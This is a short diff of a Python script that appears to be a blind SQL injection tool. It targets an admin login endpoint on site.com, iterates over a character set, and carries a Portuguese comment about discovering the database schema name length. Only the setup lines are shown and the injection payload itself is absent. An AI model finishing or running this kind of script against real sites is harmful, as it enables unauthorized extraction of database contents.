@@ -1,10 +1,11 @@
 import requests, sys, time
 
-url = "http://site.com/admin/login.php?action=login2"
-payload = {"email": ""}
 caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
+
+url = "http://site.com/admin/login.php?action=login2" # Altere a URL
+payload = {"email": ""} # Altere o nome do payload e/ou adicione mais campos para completar a requisição
 valor = ''
-tamanho = 60
+tamanho = 50
 
 ###### Descobrir o tamanho do nome do schema ######
 for tamanho in range(1,50):
